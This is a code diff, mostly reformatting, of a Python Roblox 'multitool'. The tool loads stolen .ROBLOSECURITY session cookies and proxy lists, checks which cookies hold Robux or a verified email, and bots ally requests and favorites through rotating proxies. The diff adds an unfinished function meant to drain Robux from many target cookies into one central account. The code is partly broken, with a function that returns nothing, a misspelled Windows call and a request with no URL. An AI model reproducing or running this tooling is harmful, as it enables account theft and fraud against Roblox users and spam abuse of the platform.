@@ -1,6 +1,6 @@
 # Imports
 import requests, json, threading, traceback, ctypes, os, time, random
-from colorama import Fore,Back,Style, init
+from colorama import Fore, Back, Style, init
 from bs4 import BeautifulSoup
 
 # Global Variables for threads to share
@@ -8,66 +8,86 @@ globalcsrf_token = None
 
 init()
 # Proxies and Cookies
-proxies = open('proxies.txt','r').read().splitlines()
-proxies = [{'https':'http://'+proxy} for proxy in proxies]
-cookies = open('cookies.txt','r').read().splitlines()
+proxies = open("proxies.txt", "r").read().splitlines()
+proxies = [{"https": "http://" + proxy} for proxy in proxies]
+cookies = open("cookies.txt", "r").read().splitlines()
 # Funcs
 def input_sys():
     # print(Fore.YELLOW)
-    print(Fore.YELLOW + ">>> " + Style.RESET_ALL, end='')
+    print(Fore.YELLOW + ">>> " + Style.RESET_ALL, end="")
     word = input()
     return word
 
+
 def clearscreen():
-    os.system('cls')
+    os.system("cls")
+
 
 # Get X-CSRF TOKEN -- SomethingElse
 def getxcsrf(i):
     global globalcsrf_token
     token_request = requests.session()
-    token_request.cookies['.ROBLOSECURITY'] = i
-    r = token_request.post('https://www.roblox.com/api/item.ashx?')
+    token_request.cookies[".ROBLOSECURITY"] = i
+    r = token_request.post("https://www.roblox.com/api/item.ashx?")
     try:
-        globalcsrf_token = r.headers['X-CSRF-TOKEN']
+        globalcsrf_token = r.headers["X-CSRF-TOKEN"]
     except:
         return False
-
 
 
 # Vip Scraper -- Tvnyl
 def vip_scraper():
     vip_servers = 0
-    vip_url = 'https://freerobloxvipservers.com/'
+    vip_url = "https://freerobloxvipservers.com/"
     req = requests.get(vip_url)
-    soup = BeautifulSoup(req.content, 'html.parser')
-    vip_finder = soup.find_all('p', class_='text-sm mb-0')
-    vip_link = [i.a['href'] for i in vip_finder]
-    discord_link = 'https://discord.gg/SdQ5u9x'
+    soup = BeautifulSoup(req.content, "html.parser")
+    vip_finder = soup.find_all("p", class_="text-sm mb-0")
+    vip_link = [i.a["href"] for i in vip_finder]
+    discord_link = "https://discord.gg/SdQ5u9x"
     if discord_link in vip_link:
         vip_link.remove(discord_link)
-    with open("vip_links.txt", 'w') as f:
+    with open("vip_links.txt", "w") as f:
         for i in vip_link:
             vip_servers += 1
-            print('['+Fore.GREEN+'!'+Style.RESET_ALL+']'f' Vip Servers Found {vip_servers}')
-            ctypes.windll.kernel32.SetConsoleTitleA(f'Vintle Multitool |')
-            f.write(f'{i}\n')
+            print(
+                "[" + Fore.GREEN + "!" + Style.RESET_ALL + "]"
+                f" Vip Servers Found {vip_servers}"
+            )
+            ctypes.windll.kernel32.SetConsoleTitleA(f"Vintle Multitool |")
+            f.write(f"{i}\n")
+
 
 # Ally Bot Thread Function -- SomethingElse
-def runallythread(i,GroupId):
+def runallythread(i, GroupId):
     global globalcsrf_token
     global proxies
     while True:
         ally_sent = 0
-        targetID = random.randint(1,7728165)
+        targetID = random.randint(1, 7728165)
         try:
             ally_request = requests.session()
-            ally_request.cookies['.ROBLOSECURITY'] = i
-            ally_request.headers['X-CSRF-TOKEN'] = getxcsrf(i)
-            ally_request = ally_request.post(url='https://groups.roblox.com/v1/groups/'+GroupId+'/relationships/allies/'+str(targetID),proxies=random.choice(proxies))
+            ally_request.cookies[".ROBLOSECURITY"] = i
+            ally_request.headers["X-CSRF-TOKEN"] = getxcsrf(i)
+            ally_request = ally_request.post(
+                url="https://groups.roblox.com/v1/groups/"
+                + GroupId
+                + "/relationships/allies/"
+                + str(targetID),
+                proxies=random.choice(proxies),
+            )
             if ally_request.status_code == 200:
                 ally_sent += 1
-                print('['+Fore.GREEN+'!'+Style.RESET_ALL+'] Sent ally request to '+str(targetID))
-                ctypes.windll.kernal32.SetConsoleTitleW(f'Vintle Multitool | All Requests Sent {ally_sent}')
+                print(
+                    "["
+                    + Fore.GREEN
+                    + "!"
+                    + Style.RESET_ALL
+                    + "] Sent ally request to "
+                    + str(targetID)
+                )
+                ctypes.windll.kernal32.SetConsoleTitleW(
+                    f"Vintle Multitool | All Requests Sent {ally_sent}"
+                )
             else:
                 if ally_request.status_code == 403:
                     getxcsrf(i)
@@ -83,40 +103,98 @@ def Cookie_checker(i):
     robux_acc = 0
     email_verify = 0
     req = requests.Session()
-    req.cookies['.ROBLOSECURITY'] = i
+    req.cookies[".ROBLOSECURITY"] = i
     try:
-        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
-        r = req.post('https://www.roblox.com/api/item.ashx?')
-        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
+        r = req.post("https://www.roblox.com/api/item.ashx?")
+        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
     except:
-        print('['+Fore.RED+'!'+Style.RESET_ALL+']'+'Invalid Cookie')
-    req2 = req.get('https://api.roblox.com/my/balance')
-    req3 = req.get('https://accountsettings.roblox.com/v1/email').json()
+        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
+    req2 = req.get("https://api.roblox.com/my/balance")
+    req3 = req.get("https://accountsettings.roblox.com/v1/email").json()
     try:
-        z = req2.json()['errors']
+        z = req2.json()["errors"]
     except:
-        robux = req2.json()['robux']
+        robux = req2.json()["robux"]
         robux_acc += 1
-        print('['+Fore.LIGHTGREEN_EX+'!'+Style.RESET_ALL+']'' Foud Cookie with Robux')
-        ctypes.windll.kernel32.SetConsoleTitleA(f'Vintle Multitool | Accounts With Robux Found: {robux_acc}')
-        verify = req3['verified']
+        print(
+            "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
+            " Foud Cookie with Robux"
+        )
+        ctypes.windll.kernel32.SetConsoleTitleA(
+            f"Vintle Multitool | Accounts With Robux Found: {robux_acc}"
+        )
+        verify = req3["verified"]
         if verify == True:
             email_verify += 1
-            print('['+Fore.LIGHTGREEN_EX+'!'+Style.RESET_ALL+']'' Found Cookie with Verified Email')
-            ctypes.windll.kernel32.SetConsoleTitleW(f'Vintle Multitool | Accounts With Verified Email: {email_verify}')
-            with open('checked_cookies.txt', 'w') as f:
-                f.write(f'{i}\n | Robux {robux} | Email Verified')
+            print(
+                "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
+                " Found Cookie with Verified Email"
+            )
+            ctypes.windll.kernel32.SetConsoleTitleW(
+                f"Vintle Multitool | Accounts With Verified Email: {email_verify}"
+            )
+            with open("checked_cookies.txt", "w") as f:
+                f.write(f"{i}\n | Robux {robux} | Email Verified")
         else:
-            with open('checked_cookies.txt', 'w') as f:
-                f.write(f'{i}\n | Robux {robux} | Email NotVerified')
-        
+            with open("checked_cookies.txt", "w") as f:
+                f.write(f"{i}\n | Robux {robux} | Email NotVerified")
+
+# Transfer bot - Zz
+def transfer_bot(recipient_cookie: str = None, target_cookies: list = None):
+    """
+    Transfer all robux from multiple given cookies to central account
+    
+    recipient_cookie: str -> Cookie to be recipient of all the robux
+    target_cookies: list -> Cookies to take robux from
+    """
+
+    # IN PROGRESS
+
+    if not (recipient_cookie or target_cookies):
+        print("Recipient/targets were not clarified")
+        return
+
+    config_file_data = {
+        "apple": {"type": "GamePass", "name": "Transfer Test", "description": "This is my random transfer asset",}
+    }
+
+    config_post_data = {
+        "AssetDetails": 
+            [
+                {
+                "assetId": 0,
+                "assetFileName": "config.json",
+                "uploadAssetError": "None"
+                }
+            ]
+    }
+
+    with open("config.json", "w") as f:
+        json.dump(config_file_data, fp=f)
+        print("Data loaded into file")
+
+    ck = {"Cookie":".ROBLOSECURITY={0}".format(getxcsrf(recipient_cookie))}
+
+    r = requests.post(cookies=ck,data=config_post_data)
+
+    print(r.status_code)
+    print(r.text)
+
+    # IN PROGRESS
+
 
 # Start Screen
 def StartScreen():
     clearscreen()
-    print(Fore.MAGENTA+"""
-    ███████████████████████████████████████████████████████████████████████████████████████████████████████████""")
-    print(Fore.LIGHTMAGENTA_EX+"""
+    print(
+        Fore.MAGENTA
+        + """
+    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
+    )
+    print(
+        Fore.LIGHTMAGENTA_EX
+        + """
     VVVVVVVV           VVVVVVVV  iiii                             tttt          lllllll
     V::::::V           V::::::V i::::i                         ttt:::t          l:::::l
     V::::::V           V::::::V  iiii                          t:::::t          l:::::l
@@ -133,43 +211,58 @@ def StartScreen():
               V:::::V          i::::::i  n::::n    n::::n      tt::::::::::::::tl::::::l e::::::::eeeeeeee
                V:::V           i::::::i  n::::n    n::::n        tt:::::::::::ttl::::::l  ee:::::::::::::e
                 VVV            iiiiiiii  nnnnnn    nnnnnn          ttttttttttt  llllllll   eeeeeeeeeeeeee
-                """)
-    print(Fore.MAGENTA+"""
-    ███████████████████████████████████████████████████████████████████████████████████████████████████████████""")
+                """
+    )
+    print(
+        Fore.MAGENTA
+        + """
+    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
+    )
+
 
 # Favourite Bot
 def favorite(i):
     favorited = 0
     checked = 0
-    print('Asset/Game ID')
-    id_=input_sys()
+    print("Asset/Game ID")
+    id_ = input_sys()
     req = requests.Session()
     try:
-        req.cookies['.ROBLOSECURITY'] = i
-        r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies=random.choice(proxies)).json()
-        r = req.post('https://www.roblox.com/api/item.ashx?',proxies=random.choice(proxies))
-        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+        req.cookies[".ROBLOSECURITY"] = i
+        r = req.get(
+            "http://www.roblox.com/mobileapi/userinfo", proxies=random.choice(proxies)
+        ).json()
+        r = req.post(
+            "https://www.roblox.com/api/item.ashx?", proxies=random.choice(proxies)
+        )
+        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
     except:
-        print('['+Fore.RED+'!'+Style.RESET_ALL+']'+'Invalid Cookie')
-    data ={
-    "itemTargetId":id_,
-    "favoriteType": "asset"
-    }
+        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
+    data = {"itemTargetId": id_, "favoriteType": "asset"}
     try:
-        r = req.post("https://web.roblox.com/v2/favorite/toggle",data=data,proxies=random.choice(proxies))
-        if r.json()['message'] == "Too Many Attempts":
-            print('['+ Fore.YELLOW +'!'+ Style.RESET_ALL +']')
+        r = req.post(
+            "https://web.roblox.com/v2/favorite/toggle",
+            data=data,
+            proxies=random.choice(proxies),
+        )
+        if r.json()["message"] == "Too Many Attempts":
+            print("[" + Fore.YELLOW + "!" + Style.RESET_ALL + "]")
         else:
             favorited += 1
-            print(f'['+ Fore.GREEN+'!'+Style.RESET_ALL +']' + ' Botted {favorited} favorites to game/asset: {id}')
+            print(
+                f"["
+                + Fore.GREEN
+                + "!"
+                + Style.RESET_ALL
+                + "]"
+                + " Botted {favorited} favorites to game/asset: {id}"
+            )
     except:
         pass
     checked += 1
-    ctypes.windll.kernel32.SetConsoleTitleW(f'Vintle Multitool | Favourites Earned {favorited}')
+    ctypes.windll.kernel32.SetConsoleTitleW(
+        f"Vintle Multitool | Favourites Earned {favorited}"
+    )
+
 
 # dont Put the inputs in a function
-
-
-
-
-
